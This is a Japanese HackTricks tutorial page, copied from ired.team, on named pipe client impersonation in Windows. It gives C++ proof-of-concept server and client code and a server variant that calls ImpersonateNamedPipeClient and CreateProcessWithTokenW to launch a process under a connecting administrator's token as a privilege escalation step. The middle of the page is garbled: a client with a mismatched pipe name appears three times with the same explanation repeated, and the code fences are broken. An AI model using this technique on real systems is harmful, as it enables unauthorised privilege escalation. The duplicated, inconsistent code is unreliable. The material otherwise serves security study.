# 名前付きパイプクライアントのなりすまし

## 名前付きパイプクライアントのなりすまし

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**この情報は** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation) **からコピーされました**

## 概要

`パイプ`は、プロセスが通信とデータ交換に使用できる共有メモリのブロックです。

`名前付きパイプ`は、Windowsのメカニズムであり、関連性のない2つのプロセスがデータを交換できるようにします。プロセスが2つの異なるネットワーク上にある場合でも、クライアント/サーバーアーキテクチャのような概念である`名前付きパイプサーバー`と`名前付きパイプクライアント`が存在します。

名前付きパイプサーバーは、ある事前定義された名前を持つ名前付きパイプを開き、名前がわかっている場合に名前付きパイプクライアントがそのパイプに接続できます。接続が確立されると、データの交換が開始されます。

このラボでは、次のことが可能な単一スレッドのダム名前付きパイプサーバーのPoCコードに関心があります。

* 1つのクライアント接続を受け入れる単一スレッドのダム名前付きパイプサーバーの作成
* 名前付きパイプサーバーが名前付きパイプに簡単なメッセージを書き込み、パイプクライアントがそれを読むことができるようにする

## コード

以下は、サーバーとクライアントのためのPoCです：

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // Connect to the named pipe
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to connect to the named pipe. Error code: %d\n", GetLastError());
        return 1;
    }

    // Send a message to the server
    const char* message = "Hello from the client!";
    if (!WriteFile(hPipe, message, strlen(message) + 1, &dwBytesRead, NULL))
    {
        printf("Failed to send message to the server. Error code: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // Read the response from the server
    if (!ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("Failed to read response from the server. Error code: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("Response from the server: %s\n", buffer);

    // Close the named pipe
    CloseHandle(hPipe);

    return 0;
}
```

このコードは、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取るクライアントアプリケーションです。

まず、`CreateFile`関数を使用して、名前付きパイプに接続します。接続に失敗した場合は、エラーコードを表示して終了します。

次に、`WriteFile`関数を使用して、サーバーにメッセージを送信します。送信に失敗した場合は、エラーコードを表示して終了します。

最後に、`ReadFile`関数を使用して、サーバーからの応答を受け取ります。受信に失敗した場合は、エラーコードを表示して終了します。

最後に、名前付きパイプを閉じます。

このクライアントアプリケーションをビルドして実行すると、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取ることができます。

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // 名前付きパイプに接続する
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("名前付きパイプへの接続に失敗しました。エラーコード: %d\n", GetLastError());
        return 1;
    }

    // サーバーにメッセージを送信する
    const char* message = "クライアントからこんにちは！";
    if (!WriteFile(hPipe, message, strlen(message) + 1, &dwBytesRead, NULL))
    {
        printf("サーバーへのメッセージの送信に失敗しました。エラーコード: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // サーバーからの応答を読み取る
    if (!ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("サーバーからの応答の読み取りに失敗しました。エラーコード: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("サーバーからの応答: %s\n", buffer);

    // 名前付きパイプを閉じる
    CloseHandle(hPipe);

    return 0;
}
```

このコードは、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取るクライアントアプリケーションです。

まず、`CreateFile`関数を使用して、名前付きパイプに接続します。接続に失敗した場合は、エラーコードを表示して終了します。

次に、`WriteFile`関数を使用して、サーバーにメッセージを送信します。送信に失敗した場合は、エラーコードを表示して終了します。

最後に、`ReadFile`関数を使用して、サーバーからの応答を受け取ります。受信に失敗した場合は、エラーコードを表示して終了します。

最後に、名前付きパイプを閉じます。

このクライアントアプリケーションをビルドして実行すると、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取ることができます。

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // 名前付きパイプに接続する
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("名前付きパイプへの接続に失敗しました。エラーコード: %d\n", GetLastError());
        return 1;
    }

    // サーバーにメッセージを送信する
    const char* message = "クライアントからこんにちは！";
    if (!WriteFile(hPipe, message, strlen(message) + 1, &dwBytesRead, NULL))
    {
        printf("サーバーへのメッセージの送信に失敗しました。エラーコード: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // サーバーからの応答を読み取る
    if (!ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("サーバーからの応答の読み取りに失敗しました。エラーコード: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("サーバーからの応答: %s\n", buffer);

    // 名前付きパイプを閉じる
    CloseHandle(hPipe);

    return 0;
}
```

このコードは、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取るクライアントアプリケーションです。

まず、`CreateFile`関数を使用して、名前付きパイプに接続します。接続に失敗した場合は、エラーコードを表示して終了します。

次に、`WriteFile`関数を使用して、サーバーにメッセージを送信します。送信に失敗した場合は、エラーコードを表示して終了します。

最後に、`ReadFile`関数を使用して、サーバーからの応答を受け取ります。受信に失敗した場合は、エラーコードを表示して終了します。

最後に、名前付きパイプを閉じます。

このクライアントアプリケーションをビルドして実行すると、名前付きパイプサーバーに接続し、メッセージを送信して、サーバーからの応答を受け取ることができます。
```
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## 実行

以下は、名前付きパイプサーバーと名前付きパイプクライアントが正常に動作していることを示しています：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

名前付きパイプの通信はデフォルトでSMBプロトコルを使用することに注意してください：

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

プロセスが私たちの名前付きパイプ `mantvydas-first-pipe` に対してハンドルを維持しているかどうかを確認します：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

同様に、クライアントが名前付きパイプに対して開いたハンドルを確認することもできます：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

PowerShellでパイプを確認することもできます：
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## トークンの擬似化

{% hint style="info" %}
クライアントプロセスのトークンを擬似化するためには、（パイプを作成するサーバープロセスである）**`SeImpersonate`** トークン特権を持っている必要があります。
{% endhint %}

名前付きパイプサーバーは、`ImpersonateNamedPipeClient` API呼び出しを利用して、名前付きパイプクライアントのセキュリティコンテキストを擬似化することができます。これにより、名前付きパイプサーバーの現在のスレッドのトークンが名前付きパイプクライアントのトークンに変更されます。

以下のように、名前付きパイプサーバーのコードを更新して擬似化を実現することができます。変更点は、25行目以降で確認できます。
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
サーバーを実行し、管理者@offense.localセキュリティコンテキストで実行されているクライアントに接続すると、名前付きサーバーパイプのメインスレッドが名前付きパイプクライアント（offense\administrator）のトークンを仮定していることがわかります。ただし、PipeServer.exe自体はws01\mantvydasセキュリティコンテキストで実行されています。特権をエスカレーションするための良い方法のようですね？
